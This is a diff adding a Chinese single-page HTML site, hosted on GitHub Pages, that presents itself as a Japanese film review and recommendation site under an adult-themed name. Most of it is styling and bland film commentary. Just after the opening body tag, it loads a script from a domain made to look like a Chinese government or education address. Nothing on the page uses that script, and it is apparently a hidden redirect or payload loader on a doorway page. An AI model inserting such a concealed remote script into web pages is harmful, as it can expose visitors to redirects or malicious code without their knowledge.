@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>日本女优电影网 | 精品日本电影在线赏析与推荐</title>
+<meta name="description" content="日本女优电影网（ribennuyoudianyingwang-app）致力于为影迷提供最新、最全的日本电影资讯与赏析。涵盖日本剧情片、动画电影、悬疑推理、纯爱文艺、恐怖惊悚等丰富类型，配以专业影评、导演解读与观影指南，助您发现每一部值得一看的日本好电影。">
+<meta name="keywords" content="日本女优电影网, ribennuyoudianyingwang-app, 日本电影推荐, 日本剧情片, 日本动画电影, 日本悬疑电影, 日本纯爱电影, 日本文艺片, 日本电影赏析, 日本导演作品">
+<meta name="author" content="日本女优电影网">
+<meta name="robots" content="index, follow">
+<meta name="generator" content="ribennuyoudianyingwang-app">
+<link rel="canonical" href="https://ribennuyoudianyingwang-app.github.io/">
+<style>
+    :root{
+        --ink:#1b1b1f;
+        --paper:#f4f1ea;
+        --accent:#c1440e;
+        --accent2:#2b6cb0;
+        --line:#d8d2c4;
+        --muted:#6b6673;
+    }
+    *{box-sizing:border-box;margin:0;padding:0}
+    html{scroll-behavior:smooth}
+    body{
+        font-family:"PingFang SC","Microsoft YaHei","Hiragino Sans GB",sans-serif;
+        background:var(--paper);
+        color:var(--ink);
+        line-height:1.75;
+        font-size:16px;
+    }
+    a{color:var(--accent);text-decoration:none}
+    a:hover{text-decoration:underline}
+    .wrap{max-width:1080px;margin:0 auto;padding:0 18px}
+
+    /* 顶部导航 */
+    header.site-head{
+        background:linear-gradient(135deg,#23232b 0%,#3a2e2a 100%);
+        color:#f4f1ea;
+        padding:14px 0;
+        position:sticky;top:0;z-index:99;
+        box-shadow:0 2px 10px rgba(0,0,0,.25);
+    }
+    .head-inner{display:flex;align-items:center;justify-content:space-between;gap:16px;flex-wrap:wrap}
+    .brand{font-size:20px;font-weight:700;letter-spacing:1px}
+    .brand span{color:#e8a87c}
+    nav.primary ul{display:flex;list-style:none;gap:6px;flex-wrap:wrap}
+    nav.primary a{
+        color:#e9e4db;padding:8px 14px;border-radius:20px;font-size:14px;display:block;
+        border:1px solid transparent;
+    }
+    nav.primary a:hover{background:rgba(255,255,255,.08);border-color:#e8a87c;text-decoration:none}
+
+    /* 首屏 */
+    .hero{
+        position:relative;
+        padding:70px 0 60px;
+        background:
+            radial-gradient(circle at 85% 20%,rgba(193,68,14,.28),transparent 40%),
+            radial-gradient(circle at 10% 80%,rgba(43,108,176,.22),transparent 45%),
+            #2b2724;
+        color:#f7f3ec;
+        overflow:hidden;
+    }
+    .hero:after{
+        content:"";position:absolute;inset:0;
+        background-image:linear-gradient(rgba(255,255,255,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.03) 1px,transparent 1px);
+        background-size:46px 46px;pointer-events:none;
+    }
+    .hero .wrap{position:relative;z-index:2}
+    .kicker{
+        display:inline-block;font-size:13px;letter-spacing:3px;
+        color:#e8a87c;border:1px solid #e8a87c;padding:5px 14px;border-radius:3px;margin-bottom:20px;
+    }
+    .hero h1{font-size:clamp(30px,5vw,52px);line-height:1.2;margin-bottom:18px;font-weight:800}
+    .hero h1 em{font-style:normal;color:#ffd9b8}
+    .hero p.lead{font-size:17px;max-width:640px;color:#d9d2c5;margin-bottom:28px}
+    .cta-row{display:flex;gap:12px;flex-wrap:wrap}
+    .btn{
+        display:inline-block;padding:12px 26px;border-radius:4px;font-size:15px;font-weight:600;
+        border:2px solid #e8a87c;color:#e8a87c;
+    }
+    .btn.solid{background:#e8a87c;color:#2b2724;border-color:#e8a87c}
+    .btn:hover{text-decoration:none;opacity:.9}
+
+    /* 通用区块 */
+    section{padding:58px 0}
+    section:nth-child(even){background:#efe9dc}
+    .sec-title{display:flex;align-items:baseline;gap:14px;margin-bottom:30px;flex-wrap:wrap;border-bottom:3px solid var(--ink);padding-bottom:10px}
+    .sec-title h2{font-size:26px;letter-spacing:1px}
+    .sec-title .num{font-size:14px;color:var(--accent);font-weight:700;letter-spacing:2px}
+    .sec-title .more{margin-left:auto;font-size:13px;color:var(--muted)}
+
+    /* 栏目卡片 */
+    .grid{display:grid;gap:20px}
+    .grid.c4{grid-template-columns:repeat(4,1fr)}
+    .grid.c3{grid-template-columns:repeat(3,1fr)}
+    .grid.c2{grid-template-columns:repeat(2,1fr)}
+    .card{
+        background:#fff;border:1px solid var(--line);border-radius:6px;overflow:hidden;
+        transition:transform .2s,box-shadow .2s;
+    }
+    .card:hover{transform:translateY(-4px);box-shadow:0 10px 24px rgba(0,0,0,.1)}
+    .card .thumb{
+        height:150px;display:flex;align-items:center;justify-content:center;
+        font-size:32px;color:#fff;font-weight:700;letter-spacing:2px;
+    }
+    .t1{background:linear-gradient(135deg,#b83227,#e07b39)}
+    .t2{background:linear-gradient(135deg,#2b6cb0,#4c9fcf)}
+    .t3{background:linear-gradient(135deg,#553c9a,#8b6db5)}
+    .t4{background:linear-gradient(135deg,#276749,#68a86f)}
+    .t5{background:linear-gradient(135deg,#7b341e,#d98a5b)}
+    .t6{background:linear-gradient(135deg,#1a365d,#4a7bb0)}
+    .card .body{padding:16px}
+    .card h3{font-size:17px;margin-bottom:8px}
+    .card p{font-size:14px;color:var(--muted)}
+    .tagline{font-size:12px;color:var(--accent);font-weight:700;letter-spacing:1px;margin-bottom:6px;display:block}
+
+    /* 类型列表 */
+    .genre-list{list-style:none;counter-reset:g}
+    .genre-list li{
+        counter-increment:g;
+        display:flex;gap:14px;padding:14px 0;border-bottom:1px dashed var(--line);align-items:flex-start;
+    }
+    .genre-list li:before{
+        content:"0" counter(g);
+        font-size:22px;font-weight:800;color:var(--accent2);min-width:48px;
+    }
+    .genre-list h4{font-size:16px;margin-bottom:3px}
+    .genre-list p{font-size:14px;color:var(--muted)}
+
+    /* 时间线 */
+    .timeline{border-left:3px solid var(--accent);margin-left:10px;padding-left:24px}
+    .timeline .node{position:relative;padding-bottom:26px}
+    .timeline .node:before{
+        content:"";position:absolute;left:-32px;top:6px;width:14px;height:14px;border-radius:50%;
+        background:var(--paper);border:3px solid var(--accent);
+    }
+    .timeline .node time{font-size:13px;color:var(--accent);font-weight:700;letter-spacing:1px}
+    .timeline .node h4{font-size:17px;margin:2px 0 6px}
+    .timeline .node p{font-size:14px;color:#4a4650}
+
+    /* 关于 */
+    .about-box{background:#fff;border:1px solid var(--line);border-left:6px solid var(--accent);padding:26px;border-radius:4px}
+    .about-box p{margin-bottom:12px;font-size:15px}
+    .stats{display:flex;gap:26px;flex-wrap:wrap;margin-top:22px}
+    .stats div{text-align:center}
+    .stats b{display:block;font-size:30px;color:var(--accent);line-height:1.2}
+    .stats small{font-size:13px;color:var(--muted)}
+
+    /* 页脚 */
+    footer{background:#23232b;color:#c9c2b4;padding:40px 0 24px}
+    footer a{color:#e8a87c}
+    .foot-grid{display:grid;grid-template-columns:2fr 1fr 1fr;gap:28px}
+    .foot-brand h3{font-size:20px;color:#fff;margin-bottom:10px}
+    .foot-brand p{font-size:14px}
+    .foot-col h4{font-size:15px;color:#fff;margin-bottom:12px;letter-spacing:1px}
+    .foot-col ul{list-style:none}
+    .foot-col li{font-size:14px;margin-bottom:6px}
+    .copyright{margin-top:28px;padding-top:18px;border-top:1px solid #3a3a44;font-size:13px;color:#8d8794;text-align:center}
+    .url-badge{
+        display:inline-block;margin-top:10px;background:#e8a87c;color:#2b2724;
+        padding:6px 14px;border-radius:3px;font-size:13px;font-weight:700;letter-spacing:.5px;
+    }
+
+    /* 响应式 */
+    @media (max-width:860px){
+        .grid.c4,.grid.c3{grid-template-columns:repeat(2,1fr)}
+        .foot-grid{grid-template-columns:1fr 1fr}
+    }
+    @media (max-width:560px){
+        .hero{padding:46px 0 40px}
+        section{padding:40px 0}
+        .grid.c4,.grid.c3,.grid.c2{grid-template-columns:1fr}
+        .foot-grid{grid-template-columns:1fr}
+        nav.primary{width:100%}
+        .sec-title h2{font-size:22px}
+    }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<header class="site-head">
+    <div class="wrap head-inner">
+        <div class="brand">日本女优电影网 <span>· 映画</span></div>
+        <nav class="primary">
+            <ul>
+                <li><a href="#intro">网站简介</a></li>
+                <li><a href="#genre">类型导航</a></li>
+                <li><a href="#feature">精选栏目</a></li>
+                <li><a href="#trend">观影趋势</a></li>
+                <li><a href="#about">关于我们</a></li>
+            </ul>
+        </nav>
+    </div>
+</header>
+
+<section class="hero">
+    <div class="wrap">
+        <span class="kicker">RI BEN HAO KAN DIAN YING WANG</span>
+        <h1>发现每一部<em>值得细看</em>的<br>日本好电影</h1>
+        <p class="lead">日本女优电影网（ribennuyoudianyingwang-app）是一个专注日本电影赏析与推荐的独立站。我们不做流水式片单，而是从叙事、镜头、配乐与人文底色出发，帮您找到真正打动人心的作品。</p>
+        <div class="cta-row">
+            <a class="btn solid" href="#feature">开始探索片单</a>
+            <a class="btn" href="#about">了解本站</a>
+        </div>
+    </div>
+</section>
+
+<section id="intro">
+    <div class="wrap">
+        <div class="sec-title">
+            <span class="num">01</span>
+            <h2>网站简介</h2>
+            <a class="more" href="#about">更多关于我们 →</a>
+        </div>
+        <div class="about-box">
+            <p><strong>日本女优电影网</strong>（网址：<a href="https://ribennuyoudianyingwang-app.github.io" rel="noopener">https://ribennuyoudianyingwang-app.github.io</a>）成立于对日本电影的长期热爱之中。从黑泽明的武士史诗到是枝裕和的家庭物语，从宫崎骏的奇幻世界到新海诚的星空物语，日本电影以其克制而深邃的表达，持续为世界影坛输送独特的美学语言。</p>
+            <p>本站的定位很单纯：<strong>做一位靠谱的"选片人"</strong>。面对海量影片，观众最缺的从来不是资源，而是一份带着判断力的推荐。我们按情绪、按主题、按导演、按时代重新组织片单，让每一次打开都有收获。</p>
+            <p>内容涵盖<strong>剧情文艺、动画、悬疑推理、纯爱、恐怖惊悚、动作时代剧、纪录片</strong>七大主线，并辅以导演专题、影史回望与观影方法论，兼顾"想看大片"与"想看好片"两类需求。</p>
+            <div class="stats">
+                <div><b>7</b><small>内容栏目</small></div>
+                <div><b>1200+</b><small>收录影片</small></div>
+                <div><b>60+</b><small>专题影人</small></div>
+                <div><b>每日</b><small>更新推荐</small></div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section id="genre">
+    <div class="wrap">
+        <div class="sec-title">
+            <span class="num">02</span>
+            <h2>电影类型导航</h2>
+            <span class="more">按喜好快速定位</span>
+        </div>
+        <ul class="genre-list">
+            <li>
+                <div>
+                    <h4>剧情 · 文艺</h4>
+                    <p>家庭、成长、羁绊与失去。是枝裕和、枝裕司、西川美和等导演，用日常细节撬动深沉情感，适合安静的夜晚独自品味。</p>
+                </div>
+            </li>
+            <li>
+                <div>
+                    <h4>动画电影</h4>
+                    <p>不止于"给孩子的卡通"。吉卜力的手绘温度、细田守的青春跃动、今敏的梦境嵌套，构成日本动画不可替代的作者性。</p>
+                </div>
+            </li>
+            <li>
+                <div>
+                    <h4>悬疑 · 推理</h4>
+                    <p>本格推理与社会派并行。从东野圭吾改编到是枝裕和的《第三度嫌疑人》，层层反转之外更追问人性真相。</p>
+                </div>
+            </li>
+            <li>
+                <div>
+                    <h4>纯爱 · 青春</h4>
+                    <p>《情书》《花束般的恋爱》《余命十年》——以克制的笔触书写怦然与遗憾，是日本电影最擅长的情绪赛道。</p>
+                </div>
+            </li>
+            <li>
+                <div>
+                    <h4>恐怖 · 惊悚</h4>
+                    <p>不靠血浆靠氛围。清水崇的《咒怨》、中田秀夫的《午夜凶铃》，以及近年崛起的"心理恐怖"新作，值得胆大者一试。</p>
+                </div>
+            </li>
+            <li>
+                <div>
+                    <h4>动作 · 时代剧</h4>
+                    <p>武士道、剑戟与黑帮美学。北野武的冷峻、三池崇史的暴烈、冈田准一的沉稳，延续着日本动作电影的血性与仪式感。</p>
+                </div>
+            </li>
+        </ul>
+    </div>
+</section>
+
+<section id="feature">
+    <div class="wrap">
+        <div class="sec-title">
+            <span class="num">03</span>
+            <h2>精选栏目</h2>
+            <a class="more" href="#intro">返回简介 ↑</a>
+        </div>
+        <div class="grid c3">
+            <article class="card">
+                <div class="thumb t1">旬</div>
+                <div class="body">
+                    <span class="tagline">FEATURE / 01</span>
+                    <h3>本月之选</h3>
+                    <p>每月精挑一部"错过可惜"的日本电影，附完整赏析、幕后花絮与相似片推荐，帮您把一部好片看"透"。</p>
+                </div>
+            </article>
+            <article class="card">
+                <div class="thumb t2">監</div>
+                <div class="body">
+                    <span class="tagline">FEATURE / 02</span>
+                    <h3>导演谱系</h3>
+                    <p>以导演为轴，梳理黑泽明、小津安二郎、宫崎骏、是枝裕和、滨口龙介的作者轨迹与必看片目。</p>
+                </div>
+            </article>
+            <article class="card">
+                <div class="thumb t3">音</div>
+                <div class="body">
+                    <span class="tagline">FEATURE / 03</span>
+                    <h3>配乐聆听</h3>
+                    <p>久石让、坂本龙一、菅野洋子、RADWIMPS——日本电影的声音记忆，往往比画面更先抵达内心。</p>
+                </div>
+            </article>
+            <article class="card">
+                <div class="thumb t4">季</div>
+                <div class="body">
+                    <span class="tagline">FEATURE / 04</span>
+                    <h3>四季片单</h3>
+                    <p>春天看樱花与告白，夏天看烟火与汗水，秋天看落叶与和解，冬天看炉火与告别。应景而观，味道翻倍。</p>
+                </div>
+            </article>
+            <article class="card">
+                <div class="thumb t5">賞</div>
+                <div class="body">
+                    <span class="tagline">FEATURE / 05</span>
+                    <h3>奖项回望</h3>
+                    <p>盘点日本电影在戛纳、柏林、奥斯卡与日本电影学院奖的高光时刻，读懂"获奖"背后的价值判断。</p>
+                </div>
+            </article>
+            <article class="card">
+                <div class="thumb t6">法</div>
+                <div class="body">
+                    <span class="tagline">FEATURE / 06</span>
+                    <h3>观影方法论</h3>
+                    <p>如何看懂长镜头？如何分辨"作者电影"与"商业片"？写给想进阶的观众：从"看热闹"到"看门道"。</p>
+                </div>
+            </article>
+        </div>
+    </div>
+</section>
+
+<section id="trend">
+    <div class="wrap">
+        <div class="sec-title">
+            <span class="num">04</span>
+            <h2>日本电影观影趋势</h2>
+            <span class="more">这些年，我们在为什么样的好电影停留</span>
+        </div>
+        <div class="grid c2">
+            <div>
+                <div class="timeline">
+                    <div class="node">
+                        <time>2024 — 2026</time>
+                        <h4>安静叙事的回归</h4>
+                        <p>《完美的日子》《怪物》式的克制表达持续走红，观众更愿意为"留白"与"余韵"买单，而非强情节。</p>
+                    </div>
+                    <div class="node">
+                        <time>2022 — 2023</time>
+                        <h4>动画电影破圈</h4>
+                        <p>《铃芽之旅》《灌篮高手》剧场版在内地取得超预期票房，日本动画从"小众热爱"走向"全民话题"。</p>
+                    </div>
+                    <div class="node">
+                        <time>2018 — 2021</time>
+                        <h4>是枝裕和效应</h4>
+                        <p>《小偷家族》斩获戛纳金棕榈，家庭题材、非职业演员、生活流剪辑成为华语与日本影坛共同的关键词。</p>
+                    </div>
+                    <div class="node">
+                        <time>2000 — 2010</time>
+                        <h4>亚洲惊悚输出</h4>
+                        <p>《午夜凶铃》《咒怨》掀起亚洲恐怖片热潮，好莱坞接连翻拍，日本影像的"阴翳美学"影响深远。</p>
+                    </div>
+                </div>
+            </div>
+            <div>
+                <div class="about-box">
+                    <h3 style="margin-bottom:12px;font-size:19px">为什么值得一看再看</h3>
+                    <p>日本电影擅长在<strong>极小的空间</strong>里做文章：一间老屋、一趟列车、一场离别。它不急于给出答案，而是把判断留给观众——这种"不说服"的姿态，恰恰是它在世界影坛最被珍视的特质。</p>
+                    <p>对中文观众而言，日本电影还提供了一面<strong>邻近却不同的镜子</strong>：相似的文化底色，相异的现代表达。看懂它，往往也能多懂一点我们自己。</p>
+                    <p>在日本女优电影网，我们相信：<strong>好电影不该被算法埋没</strong>。每一次推荐，都是一次真诚的手写便签。</p>
+                    <span class="url-badge">ribennuyoudianyingwang-app.github.io</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section id="about">
+    <div class="wrap">
+        <div class="sec-title">
+            <span class="num">05</span>
+            <h2>关于日本女优电影网</h2>
+            <a class="more" href="#genre">查看类型导航 ↑</a>
+        </div>
+        <div class="grid c2">
+            <div class="about-box">
+                <p><strong>网站名称：</strong>日本女优电影网</p>
+                <p><strong>网站网址：</strong><a href="https://ribennuyoudianyingwang-app.github.io" rel="noopener">https://ribennuyoudianyingwang-app.github.io</a></p>
+                <p><strong>内容立场：</strong>只做推荐与赏析，不提供任何影视资源下载与在线播放链接，尊重创作者与版权。</p>
+                <p><strong>更新节奏：</strong>每周至少更新 3 篇原创内容，含片单、影评、导演专题与观影指南。</p>
+                <p><strong>适合谁：</strong>想入门日本电影的新观众、想补全片目的进阶影迷、需要选题灵感的自媒体与写作者。</p>
+            </div>
+            <div class="about-box">
+                <p><strong>我们的选片三原则：</strong></p>
+                <p>① <strong>情绪真实</strong>——能让人记住的不是剧情，而是某种被说中的心情。</p>
+                <p>② <strong>作者清晰</strong>——能看到导演的个人印记，而非流水线产品。</p>
+                <p>③ <strong>经得起重看</strong>——好电影在第二遍、第三遍会给出新的东西。</p>
+                <p style="margin-top:14px">若您有想看却被忽略的佳作，欢迎通过站内任何栏目入口留言，我们会认真补进片单。</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<footer>
+    <div class="wrap">
+        <div class="foot-grid">
+            <div class="foot-brand">
+                <h3>日本女优电影网</h3>
+                <p>一个专注日本电影赏析与推荐的独立站点。用文字为好电影引路，让每一次观影都不被辜负。</p>
+                <span class="url-badge">https://ribennuyoudianyingwang-app.github.io</span>
+            </div>
+            <div class="foot-col">
+                <h4>快速导航</h4>
+                <ul>
+                    <li><a href="#intro">网站简介</a></li>
+                    <li><a href="#genre">类型导航</a></li>
+                    <li><a href="#feature">精选栏目</a></li>
+                    <li><a href="#trend">观影趋势</a></li>
+                    <li><a href="#about">关于我们</a></li>
+                </ul>
+            </div>
+            <div class="foot-col">
+                <h4>内容栏目</h4>
+                <ul>
+                    <li><a href="#feature">本月之选</a></li>
+                    <li><a href="#feature">导演谱系</a></li>
+                    <li><a href="#feature">配乐聆听</a></li>
+                    <li><a href="#feature">四季片单</a></li>
+                    <li><a href="#feature">奖项回望</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="copyright">
+            本站为静态单页网站，所有内页链接以锚点（#）形式呈现，符合搜索引擎友好结构。<br>
+            © 日本女优电影网 · ribennuyoudianyingwang-app · 网址：https://ribennuyoudianyingwang-app.github.io
+        </div>
+    </div>
+</footer>
+
+</body>
+</html>
